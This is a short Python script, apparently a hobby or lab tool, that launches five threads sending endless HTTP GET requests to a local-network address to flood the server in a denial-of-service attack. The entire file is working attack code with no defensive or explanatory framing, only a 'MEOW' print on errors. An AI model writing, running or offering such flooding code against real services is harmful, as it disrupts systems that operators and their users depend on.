import threading
import sys
import requests

def dos(url = "http://192.168.1.49:5000/"):
    while True:
        try:
            requests.get(url, headers={'Connection' : 'keep-alive'})
        except Exception:
            print("MEOW")
for _ in range(5):
	threading.Thread(target=dos).start()